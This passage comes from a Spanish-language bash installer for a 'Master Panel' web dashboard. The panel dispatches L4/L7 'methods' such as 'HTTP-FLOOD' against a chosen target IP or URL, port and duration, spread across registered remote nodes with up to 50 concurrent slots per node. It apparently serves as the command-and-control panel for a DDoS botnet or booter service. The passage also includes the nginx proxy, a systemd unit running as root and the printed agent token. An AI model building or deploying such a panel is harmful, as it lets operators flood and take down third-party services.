      sel.innerHTML = '<option value="">Sin métodos — crea uno en /methods</option>';
      return;
    }
    sel.innerHTML = '<option value="">— Seleccionar método —</option>' +
      methods.map(m => `<option value="${m.id}">[${m.type.toUpperCase()}] ${esc(m.name)}</option>`).join('');
  } catch(e) { console.error(e); }
}

document.getElementById('sel-method').addEventListener('change', function() {
  const id = parseInt(this.value);
  curMethod = methods.find(m => m.id === id) || null;
  document.getElementById('form-body').style.display  = curMethod ? 'block' : 'none';
  document.getElementById('form-empty').style.display = curMethod ? 'none'  : 'block';
  if (!curMethod) return;

  const isL4 = curMethod.type === 'l4';
  document.getElementById('lbl-target').textContent  = isL4 ? 'IP OBJETIVO' : 'URL OBJETIVO';
  document.getElementById('inp-target').placeholder  = isL4 ? '1.2.3.4' : 'https://example.com';

  const needPort = !!curMethod.requires_port;
  const portEl   = document.getElementById('fg-port');
  portEl.style.display = needPort ? 'block' : 'none';

  // Ajustar grid según si hay puerto
  document.querySelector('.conc-row').style.gridTemplateColumns = needPort ? '1fr 1fr' : '1fr';
  updateConcHint();
});

async function launch() {
  if (!curMethod) return;
  const target = document.getElementById('inp-target').value.trim();
  const port   = document.getElementById('inp-port').value;
  const time   = document.getElementById('inp-time').value;
  const conc   = parseInt(document.getElementById('inp-conc').value) || 1;

  if (!target || !time) return alert('Completa todos los campos');
  if (curMethod.requires_port && !port) return alert('Puerto requerido para este método');

  const btn = document.getElementById('btn-launch');
  btn.disabled = true;
  btn.textContent = 'Enviando...';

  try {
    const r = await fetch('/api/tasks', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ method_id: curMethod.id, target, port: port || null, time: parseInt(time), concurrents: conc })
    });
    const d = await r.json();
    if (d.success) {
      btn.textContent = `✅ ${d.total_slots} slots en ${d.nodes} nodo(s)`;
      setTimeout(() => { btn.textContent = '⚡ Ejecutar Operación'; btn.disabled = false; }, 3000);
      loadTasks();
    } else {
      alert('Error: ' + (d.error || 'Desconocido'));
      btn.textContent = '⚡ Ejecutar Operación';
      btn.disabled = false;
    }
  } catch(e) {
    alert('Error de conexión');
    btn.textContent = '⚡ Ejecutar Operación';
    btn.disabled = false;
  }
}

async function cancelTask(id) {
  if (!confirm('¿Cancelar tarea #' + id + '?')) return;
  await fetch('/api/tasks/' + id, { method: 'DELETE' });
  setTimeout(loadTasks, 500);
}

// ── Nodes (solo activos, offline se auto-eliminan) ────────
async function loadNodes() {
  try {
    const r = await fetch('/api/nodes');
    const nodes = await r.json();

    document.getElementById('node-count').textContent  = nodes.length;
    document.getElementById('avail-nodes').textContent = `${nodes.filter(n=>n.status==='online').length} nodos online`;
    updateConcHint();

    const el = document.getElementById('nodes-list');
    if (!nodes.length) { el.innerHTML = '<div class="empty">Sin nodos activos</div>'; return; }

    el.innerHTML = nodes.map(n => {
      const cpuColor = n.cpu > 80 ? 'var(--danger)' : n.cpu > 60 ? 'var(--warn)' : 'var(--accent)';
      const ramColor = n.ram > 80 ? 'var(--danger)' : n.ram > 60 ? 'var(--warn)' : 'var(--info)';
      return `
        <div class="node-card">
          <span style="font-size:1.4rem">${flag(n.country_code)}</span>
          <div class="node-body">
            <div class="node-name">${esc(n.name)}</div>
            <div class="node-meta">${esc(n.ip)} · ${esc(n.country)} · ${n.total_tasks} tasks</div>
          </div>
          <div class="node-bars">
            <div class="bar-row">
              <span>CPU ${Math.round(n.cpu)}%</span>
              <div class="bar-track"><div class="bar-fill" style="width:${Math.min(n.cpu,100)}%;background:${cpuColor}"></div></div>
            </div>
            <div class="bar-row">
              <span>RAM ${Math.round(n.ram)}%</span>
              <div class="bar-track"><div class="bar-fill" style="width:${Math.min(n.ram,100)}%;background:${ramColor}"></div></div>
            </div>
          </div>
          <div class="ndot ${n.status}"></div>
        </div>`;
    }).join('');
  } catch(e) {}
}

// ── Tasks ─────────────────────────────────────────────────
function parseNodesInfo(info) {
  // Format: "nodeName:status:slot,nodeName:status:slot,..."
  // Group by nodeName → show aggregate
  if (!info) return '';
  const map = {};
  info.split(',').forEach(chunk => {
    const parts = chunk.split(':');
    const name = parts[0];
    const st   = parts[1] || 'unknown';
    if (!map[name]) map[name] = { running: 0, pending: 0, completed: 0, failed: 0, cancelled: 0, total: 0 };
    map[name][st] = (map[name][st] || 0) + 1;
    map[name].total++;
  });

  return Object.entries(map).map(([name, counts]) => {
    // Dominant status
    let dom = 'pending';
    if (counts.running > 0)   dom = 'running';
    else if (counts.failed > 0) dom = 'failed';
    else if (counts.cancelled > 0) dom = 'cancelled';
    else if (counts.completed > 0) dom = 'completed';

    const c = dom === 'running'   ? 'var(--warn)'
            : dom === 'completed' ? 'var(--accent)'
            : dom === 'failed'    ? 'var(--danger)'
            : dom === 'cancelled' ? 'var(--danger)'
            : 'var(--muted)';

    const dotColor = c;
    const label = counts.total > 1
      ? `${esc(name)} ×${counts.total}${counts.running ? ` (${counts.running}▶)` : ''}`
      : esc(name);

    return `<span class="task-node-chip" style="border-color:${c};color:${c}">
      <span class="chip-dot" style="background:${dotColor}"></span>${label}
    </span>`;
  }).join('');
}

async function loadTasks() {
  try {
    const r = await fetch('/api/tasks');
    const tasks = await r.json();
    const el = document.getElementById('tasks-list');

    if (!tasks.length) { el.innerHTML = '<div class="empty">Sin operaciones registradas</div>'; return; }

    el.innerHTML = tasks.map(t => {
      const canCancel = t.status === 'running' || t.status === 'pending';
      const nodesHtml = parseNodesInfo(t.nodes_info);
      const concLabel = t.concurrents > 1 ? ` · ×${t.concurrents}/nodo` : '';
      return `
        <div class="task-row">
          <div class="task-top">
            <div>
              <span class="task-id">#${t.id}</span>
              <span class="task-name">${esc(t.method_name || '?')}</span>
              <div class="task-target">${esc(t.target)}${t.port ? ':'+t.port : ''} · ${t.time}s${concLabel}</div>
            </div>
            <div style="display:flex;align-items:center;gap:.5rem;flex-shrink:0">
              <span class="badge badge-${t.status}">${t.status}</span>
              ${canCancel ? `<button class="btn btn-cancel" onclick="cancelTask(${t.id})">✕ Cancelar</button>` : ''}
            </div>
          </div>
          <div class="task-meta">📅 ${ts(t.created_at)}${t.completed_at ? ' → '+ts(t.completed_at) : ''}</div>
          ${nodesHtml ? `<div class="task-nodes">${nodesHtml}</div>` : ''}
        </div>`;
    }).join('');
  } catch(e) {}
}

// ── Logs SSE ──────────────────────────────────────────────
function initLogs() {
  const wrap = document.getElementById('log-wrap');
  const sse  = new EventSource('/api/logs/stream');
  sse.onmessage = e => {
    const log = JSON.parse(e.data);
    const row = document.createElement('div');
    row.className = 'log-entry';
    row.innerHTML = `
      <span class="log-ts">${ts(log.timestamp)}</span>
      <span class="log-lv ${log.level}">[${log.level.toUpperCase()}]</span>
      <span class="log-msg">${esc(log.message)}</span>`;
    wrap.appendChild(row);
    wrap.scrollTop = wrap.scrollHeight;
    while (wrap.children.length > 300) wrap.removeChild(wrap.firstChild);
  };
  sse.onerror = () => { sse.close(); setTimeout(initLogs, 5000); };
}

// ── Init ──────────────────────────────────────────────────
loadMethods();
loadNodes();
loadTasks();
initLogs();

setInterval(loadNodes, 5000);
setInterval(loadTasks, 5000);
</script>
</body>
</html>
INDEXEOF

ok "index.html creado"

# ============================================================
# [5/8] FRONTEND — methods.html
# ============================================================
step 5 "Generando página de métodos (methods.html)..."

cat > $INSTALL_DIR/public/methods.html << 'METHODSEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Métodos — Master Panel</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#070a12;--surface:#0c1220;--card:#111d2e;--card2:#0f1928;
  --border:#1a2e4a;--border2:#243d5f;
  --accent:#00d4aa;--accent2:#00a882;--accent-dim:rgba(0,212,170,.08);
  --danger:#ff4d6d;--danger-dim:rgba(255,77,109,.1);
  --warn:#ffd166;--warn-dim:rgba(255,209,102,.1);
  --info:#4da6ff;
  --text:#c8d8e8;--muted:#4a6888;--muted2:#2a4a68;
  --font:'JetBrains Mono',monospace;
}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:13px;min-height:100vh;
  background-image:radial-gradient(ellipse at 20% 0%,rgba(0,212,170,.04) 0%,transparent 60%);
}
header{
  position:sticky;top:0;z-index:50;
  background:rgba(7,10,18,.92);backdrop-filter:blur(12px);
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  padding:.75rem 1.5rem;
}
.logo{display:flex;align-items:center;gap:.6rem;}
.logo-icon{font-size:1.1rem;}
.logo-text{font-size:.9rem;font-weight:700;color:var(--accent);letter-spacing:3px;text-transform:uppercase;}
nav a{color:var(--muted);text-decoration:none;font-size:.75rem;letter-spacing:1.5px;text-transform:uppercase;margin-left:1.5rem;transition:color .2s;}
nav a:hover{color:var(--text);}
nav a.active{color:var(--accent);}
.wrap{max-width:1200px;margin:0 auto;padding:1.25rem 1.5rem;}
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.1rem;}
.card-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;padding-bottom:.6rem;border-bottom:1px solid var(--border);}
.card-title{font-size:.65rem;font-weight:700;letter-spacing:2.5px;color:var(--muted);text-transform:uppercase;}
table{width:100%;border-collapse:collapse;}
th{font-size:.62rem;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;padding:.5rem .75rem;border-bottom:1px solid var(--border);text-align:left;font-weight:600;}
td{padding:.7rem .75rem;border-bottom:1px solid rgba(255,255,255,.03);font-size:.82rem;vertical-align:middle;}
tr:hover td{background:rgba(255,255,255,.015);}
code{font-family:var(--font);color:var(--accent);font-size:.8rem;}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:.35rem;border:none;border-radius:5px;cursor:pointer;font-family:var(--font);font-size:.72rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;transition:all .2s;padding:.4rem .8rem;}
.btn-primary{background:var(--accent);color:#070a12;}
.btn-primary:hover{background:var(--accent2);}
.btn-sm-ghost{background:transparent;border:1px solid var(--border);color:var(--muted);}
.btn-sm-ghost:hover{border-color:var(--border2);color:var(--text);}
.btn-sm-danger{background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);}
.btn-sm-danger:hover{background:var(--danger);color:#fff;}
.badge{padding:.2rem .55rem;border-radius:20px;font-size:.62rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
.badge-l4{background:var(--accent-dim);color:var(--accent);border:1px solid rgba(0,212,170,.3);}
.badge-l7{background:var(--warn-dim);color:var(--warn);border:1px solid rgba(255,209,102,.3);}
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;z-index:100;opacity:0;pointer-events:none;transition:opacity .2s;}
.modal-bg.open{opacity:1;pointer-events:all;}
.modal{background:var(--card);border:1px solid var(--border2);border-radius:10px;padding:1.4rem;width:100%;max-width:540px;max-height:90vh;overflow-y:auto;transform:translateY(8px);transition:transform .2s;}
.modal-bg.open .modal{transform:translateY(0);}
.modal-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.1rem;padding-bottom:.6rem;border-bottom:1px solid var(--border);}
.modal-title{font-size:.68rem;font-weight:700;letter-spacing:2px;color:var(--muted);text-transform:uppercase;}
.close-btn{background:none;border:none;color:var(--muted);cursor:pointer;font-size:1.1rem;line-height:1;transition:color .2s;}
.close-btn:hover{color:var(--text);}
.fg{margin-bottom:.85rem;}
label{display:block;font-size:.62rem;letter-spacing:1.5px;color:var(--muted);margin-bottom:.3rem;text-transform:uppercase;}
select,input[type=text],input[type=number]{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:.5rem .7rem;font-family:var(--font);font-size:.85rem;outline:none;transition:border-color .2s;}
select:focus,input:focus{border-color:var(--accent);}
select option{background:var(--card);}
.col2{display:grid;grid-template-columns:1fr 1fr;gap:.85rem;}
.hint{font-size:.62rem;color:var(--muted);margin-top:.3rem;line-height:1.6;}
.hint code{color:var(--accent);font-size:.62rem;}
.preview-box{background:var(--surface);border:1px solid var(--border);border-radius:5px;padding:.65rem .75rem;margin-bottom:.85rem;font-size:.75rem;}
.preview-label{font-size:.6rem;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:.25rem;}
.preview-cmd{color:var(--accent);word-break:break-all;}
.modal-footer{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;}
.empty{text-align:center;padding:2.5rem;color:var(--muted);font-size:.82rem;}
</style>
</head>
<body>

<header>
  <div class="logo">
    <span class="logo-icon">⚡</span>
    <span class="logo-text">Master Command</span>
  </div>
  <nav>
    <a href="/">Dashboard</a>
    <a href="/methods" class="active">Métodos</a>
  </nav>
</header>

<div class="wrap">
  <div class="card">
    <div class="card-hd">
      <span class="card-title">📋 Métodos Configurados</span>
      <button class="btn btn-primary" onclick="openModal()">+ Nuevo Método</button>
    </div>
    <table>
      <thead>
        <tr>
          <th>Nombre</th><th>Tipo</th><th>Función</th><th>Archivo</th><th>Puerto</th><th>Argumentos</th><th>Acciones</th>
        </tr>
      </thead>
      <tbody id="tbl-body">
        <tr><td colspan="7"><div class="empty">Sin métodos creados</div></td></tr>
      </tbody>
    </table>
  </div>
</div>

<div class="modal-bg" id="modal-bg" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-hd">
      <span class="modal-title" id="modal-ttl">Nuevo Método</span>
      <button class="close-btn" onclick="closeModal()">✕</button>
    </div>
    <div class="fg">
      <label>Nombre del método</label>
      <input type="text" id="m-name" placeholder="HTTP-FLOOD">
    </div>
    <div class="col2">
      <div class="fg">
        <label>Tipo</label>
        <select id="m-type">
          <option value="l4">Layer 4 (L4)</option>
          <option value="l7">Layer 7 (L7)</option>
        </select>
      </div>
      <div class="fg">
        <label>Requiere Puerto</label>
        <select id="m-port">
          <option value="0">No</option>
          <option value="1">Sí</option>
        </select>
      </div>
    </div>
    <div class="col2">
      <div class="fg">
        <label>Tipo de ejecución</label>
        <select id="m-func" onchange="updatePreview()">
          <option value="file">Archivo bash (./script)</option>
          <option value="python">Python (python3)</option>
          <option value="node">Node.js (node)</option>
        </select>
      </div>
      <div class="fg">
        <label>Nombre del archivo</label>
        <input type="text" id="m-file" placeholder="flood.sh" oninput="updatePreview()">
      </div>
    </div>
    <div class="fg">
      <label>Argumentos</label>
      <input type="text" id="m-args" placeholder="-h {ip} -p {port} -t {time}" oninput="updatePreview()">
      <div class="hint">Variables: <code>{ip}</code> <code>{url}</code> <code>{port}</code> <code>{time}</code> <code>{host}</code></div>
    </div>
    <div class="preview-box">
      <div class="preview-label">Preview del comando</div>
      <div class="preview-cmd" id="prev-cmd">—</div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-sm-ghost" onclick="closeModal()">Cancelar</button>
      <button class="btn btn-primary" onclick="saveMethod()">💾 Guardar</button>
    </div>
  </div>
</div>

<script>
let methods = [];
let editingId = null;
function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function updatePreview() {
  const fn = document.getElementById('m-func').value;
  const file = document.getElementById('m-file').value || 'script.sh';
  const args = document.getElementById('m-args').value || '';
  let cmd;
  switch(fn) {
    case 'python': cmd = `python3 scripts/${file} ${args}`; break;
    case 'node':   cmd = `node scripts/${file} ${args}`; break;
    default:       cmd = `./scripts/${file} ${args}`; break;
  }
  document.getElementById('prev-cmd').textContent = cmd.trim();
}
async function loadMethods() {
  const r = await fetch('/api/methods');
  methods = await r.json();
  renderTable();
}
function renderTable() {
  const tbody = document.getElementById('tbl-body');
  if (!methods.length) {
    tbody.innerHTML = '<tr><td colspan="7"><div class="empty">Sin métodos creados — agrega uno con el botón de arriba</div></td></tr>';
    return;
  }
  const fnLabel = { file: 'Bash', python: 'Python', node: 'Node.js' };
  tbody.innerHTML = methods.map(m => `
    <tr>
      <td><strong>${esc(m.name)}</strong></td>
      <td><span class="badge badge-${m.type}">${m.type.toUpperCase()}</span></td>
      <td>${fnLabel[m.function_type] || m.function_type}</td>
      <td><code>${esc(m.file_name)}</code></td>
      <td>${m.requires_port ? '✓' : '—'}</td>
      <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
        <code style="color:var(--muted);font-size:.72rem">${esc(m.arguments||'—')}</code>
      </td>
      <td>
        <button class="btn btn-sm-ghost" style="margin-right:.4rem" onclick="editMethod(${m.id})">Editar</button>
        <button class="btn btn-sm-danger" onclick="delMethod(${m.id},'${esc(m.name)}')">Borrar</button>
      </td>
    </tr>
  `).join('');
}
function openModal(id = null) {
  editingId = id;
  document.getElementById('modal-ttl').textContent = id ? 'EDITAR MÉTODO' : 'NUEVO MÉTODO';
  if (!id) {
    ['m-name','m-file','m-args'].forEach(x => document.getElementById(x).value = '');
    document.getElementById('m-type').value = 'l4';
    document.getElementById('m-port').value = '0';
    document.getElementById('m-func').value = 'file';
    updatePreview();
  }
  document.getElementById('modal-bg').classList.add('open');
}
function closeModal() {
  document.getElementById('modal-bg').classList.remove('open');
  editingId = null;
}
function editMethod(id) {
  const m = methods.find(x => x.id === id);
  if (!m) return;
  document.getElementById('m-name').value = m.name;
  document.getElementById('m-type').value = m.type;
  document.getElementById('m-port').value = m.requires_port ? '1' : '0';
  document.getElementById('m-func').value = m.function_type;
  document.getElementById('m-file').value = m.file_name;
  document.getElementById('m-args').value = m.arguments || '';
  updatePreview();
  openModal(id);
}
async function saveMethod() {
  const data = {
    name:          document.getElementById('m-name').value.trim(),
    type:          document.getElementById('m-type').value,
    requires_port: document.getElementById('m-port').value === '1',
    function_type: document.getElementById('m-func').value,
    file_name:     document.getElementById('m-file').value.trim(),
    arguments:     document.getElementById('m-args').value.trim()
  };
  if (!data.name || !data.file_name) return alert('Nombre y archivo son requeridos');
  const url    = editingId ? `/api/methods/${editingId}` : '/api/methods';
  const method = editingId ? 'PUT' : 'POST';
  const r      = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
  const res    = await r.json();
  if (res.success) { closeModal(); loadMethods(); }
  else alert('Error: ' + (res.error || 'Desconocido'));
}
async function delMethod(id, name) {
  if (!confirm(`¿Eliminar método "${name}"?\n\nEsta acción no se puede deshacer.`)) return;
  await fetch(`/api/methods/${id}`, { method: 'DELETE' });
  loadMethods();
}
loadMethods();
</script>
</body>
</html>
METHODSEOF

ok "methods.html creado"

# ============================================================
# [6/8] NPM INSTALL
# ============================================================
step 6 "Instalando dependencias npm..."
cd $INSTALL_DIR
npm install --omit=dev --quiet 2>/dev/null
ok "Dependencias instaladas"

# ============================================================
# [7/8] NGINX + SYSTEMD
# ============================================================
step 7 "Configurando nginx y servicio systemd..."

cat > /etc/nginx/sites-available/master << 'NGINXEOF'
server {
    listen 80 default_server;
    server_name _;
    client_max_body_size 10M;

    location /api/logs/stream {
        proxy_pass         http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header   Connection '';
        proxy_buffering    off;
        proxy_cache        off;
        proxy_read_timeout 86400s;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        chunked_transfer_encoding on;
    }

    location /api/agent/ {
        proxy_pass         http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location / {
        proxy_pass         http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection 'upgrade';
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_cache_bypass $http_upgrade;
    }
}
NGINXEOF

ln -sf /etc/nginx/sites-available/master /etc/nginx/sites-enabled/master
rm -f /etc/nginx/sites-enabled/default
nginx -t 2>/dev/null && systemctl reload nginx
ok "nginx configurado"

cat > /etc/systemd/system/master.service << 'SVCEOF'
[Unit]
Description=Master Panel v2.0 — Node Management System
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/master
EnvironmentFile=/opt/master/.env
ExecStart=/usr/bin/node /opt/master/server.js
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=master-panel

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable master > /dev/null 2>&1
ok "systemd configurado"

# ============================================================
# [8/8] START SERVICES
# ============================================================
step 8 "Iniciando servicios..."
systemctl start master
sleep 2

if systemctl is-active --quiet master; then
  ok "master-panel corriendo"
else
  echo -e "  ${RED}✘ El servicio no arrancó. Revisa: journalctl -u master -n 30${NC}"
fi

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║           MASTER PANEL v2.0 INSTALADO ✅                  ║"
echo "╠═══════════════════════════════════════════════════════════╣"
printf "║  Panel Web  →  http://%-38s ║\n" "$PUBLIC_IP"
printf "║  Métodos    →  http://%-38s ║\n" "$PUBLIC_IP/methods"
echo "║                                                           ║"
printf "║  Token: %-52s ║\n" "${AGENT_TOKEN:0:50}"
printf "║         %-52s ║\n" "${AGENT_TOKEN:50}"
echo "║                                                           ║"
echo "║  Novedades v2.0:                                          ║"
echo "║   ✔ Concurrentes por nodo (1-50x)                         ║"
echo "║   ✔ Nodos aceptan múltiples tareas simultáneas            ║"
echo "║   ✔ Nodos offline auto-eliminados a los 5 min             ║"
echo "╠═══════════════════════════════════════════════════════════╣"
echo "║  systemctl status master  |  journalctl -u master -f      ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}⚠ Guarda el AGENT_TOKEN — necesario para los nodos${NC}"
echo ""
